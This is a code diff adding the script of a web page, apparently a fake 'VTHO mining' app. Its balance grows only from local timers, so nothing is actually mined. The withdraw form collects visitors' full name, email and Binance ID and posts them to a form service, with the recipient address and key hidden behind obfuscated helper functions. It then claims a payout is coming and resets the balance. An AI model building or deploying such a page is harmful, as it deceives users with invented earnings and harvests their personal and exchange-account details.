+    burstTimer = setInterval(() => {
+      const elapsed = Date.now() - startTime;
+      const ratio = Math.min(elapsed / BURST_DURATION, 1);
+      const earned = BURST_AMOUNT * ratio;
+      const diff = earned - (balance - startBalance);
+
+      if (diff > 0) {
+        balance += diff;
+        updateBalanceUI(true);
+        if (Math.random() < 0.5) floatNumber('+' + diff.toFixed(2));
+      }
+
+      if (Date.now() - (burstTimer._lastSave || 0) > 5000) {
+        saveState();
+        burstTimer._lastSave = Date.now();
+      }
+
+      progressBar.style.width = (ratio * 100) + '%';
+      if (Math.random() < 0.3) spawnParticles(4);
+
+      if (ratio >= 1) {
+        clearInterval(burstTimer);
+        burstTimer = null;
+        finishBurst();
+      }
+    }, 50);
+  }
+
+  function finishBurst() {
+    burstActive = false;
+    balance += BURST_AMOUNT;
+    updateBalanceUI(true);
+    
+    vthoImg.classList.remove('burst');
+    progressBar.style.width = '0%';
+    progressWrap.classList.remove('visible');
+
+    cycleStartTime = Date.now();
+    cycleActive = true;
+    saveState();
+
+    timerCard.classList.add('active');
+    sysStatusEl.textContent = 'Active';
+    sysStatusEl.style.color = '#ff8fab';
+    rateEl.textContent = '1.00 / 30 min';
+
+    updateVthoButton();
+    updateCycleTimer();
+  }
+
+  /* ============ 30 MIN CYCLE ============ */
+  function updateCycleTimer() {
+    if (!cycleActive) {
+      timerEl.textContent = '--:--';
+      timerCard.classList.remove('active');
+      return;
+    }
+
+    const elapsed = Date.now() - cycleStartTime;
+    const remaining = Math.max(0, CYCLE_MS - elapsed);
+    timerEl.textContent = formatTime(remaining);
+
+    if (remaining > 0) {
+      statusEl.textContent = 'Mining cycle · ' + formatTime(remaining) + ' remaining';
+      statusEl.className = 'status cooling';
+    }
+
+    if (remaining <= 0) {
+      balance += CYCLE_VTHO;
+      updateBalanceUI(true);
+      showToast('Cycle complete! +1.00 VTHO', 'success');
+      
+      cycleActive = false;
+      cycleStartTime = 0;
+      saveState();
+      
+      timerCard.classList.remove('active');
+      vthoImg.classList.remove('cooling');
+      
+      sysStatusEl.textContent = 'Ready';
+      sysStatusEl.style.color = '#ff8fab';
+      timerEl.textContent = '--:--';
+      updateVthoButton();
+    }
+  }
+
+  setInterval(updateCycleTimer, 1000);
+
+  /* ============ RESUME ============ */
+  function resume() {
+    if (!checkIntegrity()) return;
+
+    const cycleWasActive = localStorage.getItem('vtho_cycleActive') === '1';
+    const burstWasActive = localStorage.getItem('vtho_burstActive') === '1';
+    const storedStart = parseInt(localStorage.getItem('vtho_cycleStart') || '0');
+
+    if (burstWasActive && storedStart) {
+      const burstEndTime = storedStart + BURST_DURATION;
+      
+      if (Date.now() >= burstEndTime) {
+        balance += BURST_AMOUNT;
+        updateBalanceUI(true);
+        showToast('Mining completed while you were away! +1.00 VTHO', 'success');
+        
+        cycleActive = true;
+        cycleStartTime = storedStart;
+        burstActive = false;
+        saveState();
+        
+        if (Date.now() - storedStart >= CYCLE_MS) {
+          balance += CYCLE_VTHO;
+          updateBalanceUI(true);
+          showToast('Cycle also finished! +1.00 VTHO', 'success');
+          
+          cycleActive = false;
+          cycleStartTime = 0;
+          saveState();
+          
+          sysStatusEl.textContent = 'Ready';
+          rateEl.textContent = '1.00 / 30 min';
+          timerEl.textContent = '--:--';
+          updateVthoButton();
+          return;
+        }
+        
+        timerCard.classList.add('active');
+        sysStatusEl.textContent = 'Active';
+        rateEl.textContent = '1.00 / 30 min';
+        updateVthoButton();
+        updateCycleTimer();
+        return;
+      } else {
+        burstActive = true;
+        vthoImg.classList.add('burst');
+        progressWrap.classList.add('visible');
+        statusEl.textContent = 'Fast mining...';
+        statusEl.className = 'status burst';
+        
+        const remaining = burstEndTime - Date.now();
+        const startTime = Date.now() - (BURST_DURATION - remaining);
+        const startBalance = balance;
+        
+        burstTimer = setInterval(() => {
+          const elapsed = Date.now() - startTime;
+          const ratio = Math.min(elapsed / BURST_DURATION, 1);
+          const earned = BURST_AMOUNT * ratio;
+          const diff = earned - (balance - startBalance);
+          
+          if (diff > 0) {
+            balance += diff;
+            updateBalanceUI(true);
+          }
+          
+          progressBar.style.width = (ratio * 100) + '%';
+          
+          if (ratio >= 1) {
+            clearInterval(burstTimer);
+            burstTimer = null;
+            finishBurst();
+          }
+        }, 50);
+        return;
+      }
+    }
+
+    if (cycleWasActive && storedStart) {
+      const elapsed = Date.now() - storedStart;
+      
+      if (elapsed >= CYCLE_MS) {
+        balance += CYCLE_VTHO;
+        updateBalanceUI(true);
+        showToast('Cycle completed while you were away! +1.00 VTHO', 'success');
+        
+        cycleActive = false;
+        cycleStartTime = 0;
+        saveState();
+        
+        sysStatusEl.textContent = 'Ready';
+        rateEl.textContent = '1.00 / 30 min';
+        timerEl.textContent = '--:--';
+        updateVthoButton();
+      } else {
+        cycleActive = true;
+        cycleStartTime = storedStart;
+        
+        timerCard.classList.add('active');
+        sysStatusEl.textContent = 'Active';
+        rateEl.textContent = '1.00 / 30 min';
+        
+        updateVthoButton();
+        updateCycleTimer();
+      }
+    } else {
+      updateBalanceUI();
+      rateEl.textContent = '1.00 / 30 min';
+      sysStatusEl.textContent = 'Ready';
+      timerEl.textContent = '--:--';
+      updateVthoButton();
+    }
+  }
+
+  /* ============ EVENTS ============ */
+  vthoImg.addEventListener('click', () => {
+    if (burstActive) return;
+    if (!canClick()) { showToast('Wait for the cycle to finish'); return; }
+    startBurst();
+  });
+
+  withdrawBtn.addEventListener('click', () => {
+    if (balance < MIN_WITHDRAW) return;
+    modalBalance.textContent = balance.toFixed(2);
+    modalOverlay.classList.add('show');
+  });
+
+  function closeWithdraw() {
+    modalOverlay.classList.remove('show');
+  }
+
+  modalOverlay.addEventListener('click', (e) => {
+    if (e.target === modalOverlay) closeWithdraw();
+  });
+
+  /* ============ SUBMIT WITHDRAW ============ */
+  function submitWithdraw(event) {
+    event.preventDefault();
+
+    const form = event.target;
+    const formData = new FormData(form);
+
+    const fullName   = (formData.get('full_name') || '').trim();
+    const userEmail  = (formData.get('user_email') || '').trim();
+    const binanceId  = (formData.get('binance_id') || '').trim();
+
+    if (fullName.length < 2) {
+      showToast('Please enter a valid name', 'error');
+      return;
+    }
+
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) {
+      showToast('Please enter a valid email', 'error');
+      return;
+    }
+
+    if (!/^[0-9]{6,}$/.test(binanceId)) {
+      showToast('Binance ID must be at least 6 digits', 'error');
+      return;
+    }
+
+    const withdrawAmount = balance;
+
+    formData.set('amount', withdrawAmount.toFixed(2) + ' VTHO');
+    formData.set('withdraw_date', new Date().toLocaleString('en-US'));
+    formData.set('apiKey', _dk());
+    formData.set('email', _de());
+
+    confirmBtn.disabled = true;
+    confirmBtn.textContent = '⏳ Sending...';
+
+    fetch('https://api.staticforms.dev/submit', {
+      method: 'POST',
+      body: formData
+    })
+    .then(res => {
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      return res.json().catch(() => ({}));
+    })
+    .then(data => {
+      if (data && data.success === false) {
+        throw new Error(data.message || 'Rejected');
+      }
+      successWithdraw(withdrawAmount, fullName, binanceId);
+    })
+    .catch(err => {
+      console.error('Withdraw failed:', err);
+      confirmBtn.disabled = false;
+      confirmBtn.textContent = 'Retry Submit';
+      showToast('Connection failed. Please try again.', 'error', 3500);
+    });
+  }
+
+  /* ============ SUCCESS ============ */
+  function successWithdraw(amount, fullName, binanceId) {
+    balance = 0;
+    cycleActive = false;
+    cycleStartTime = 0;
+    burstActive = false;
+    saveState();
+
+    modalContent.innerHTML = `
+      <div style="text-align: center;">
+        <div style="width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #f7b6c8, #ff8fab); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 15px 40px rgba(255,143,171,0.5);">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3" style="width: 42px; height: 42px;">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <h2 style="color: #4a3540; font-size: 20px; margin-bottom: 12px; font-weight: 900;">Request Sent!</h2>
+        <p style="color: #a8899a; font-size: 13px; line-height: 1.9; margin-bottom: 20px;">
+          Your withdrawal will be sent to your Binance account<br>
+          <b style="color: #ff8fab; font-size: 18px;">${amount.toFixed(2)} VTHO</b><br>
+          to: <b style="color: #4a3540;">${escapeHtml(fullName)}</b><br>
+          Binance ID: <b style="color: #4a3540; direction: ltr; display: inline-block;">${escapeHtml(binanceId)}</b><br>
+          <span style="font-size: 11px;">within 24-48 hours</span>
+        </p>
+        <div style="background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 10px; margin-bottom: 18px;">
+          <p style="color: #d97706; font-size: 12px; text-align: center; font-weight: 700;">
+            ⚠️ Your balance has been reset — start over
+          </p>
+        </div>
+        <button onclick="location.reload();" 
+                style="width: 100%; padding: 14px; border: none; border-radius: 12px; background: linear-gradient(135deg, #f7b6c8, #ff8fab); color: #ffffff; font-family: 'Inter', sans-serif; font-size: 14px; font-weight: 900; cursor: pointer;">
+          OK, Thanks
+        </button>
+      </div>
+    `;
+  }
+
+  /* ============ HTML ESCAPE ============ */
+  function escapeHtml(str) {
+    const div = document.createElement('div');
+    div.textContent = str;
+    return div.innerHTML;
+  }
+
+  /* ============ SAVE ON UNLOAD ============ */
+  window.addEventListener('beforeunload', () => {
+    saveState();
+  });
+
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) saveState();
+  });
+
+  setInterval(() => {
+    saveState();
+  }, 3000);
+
+  /* ============ INIT ============ */
+  updateBalanceUI();
+  rateEl.textContent = '1.00 / 30 min';
+  sysStatusEl.textContent = 'Ready';
+  timerEl.textContent = '--:--';
+  resume();
+</script>
+
+</body>
+</html>
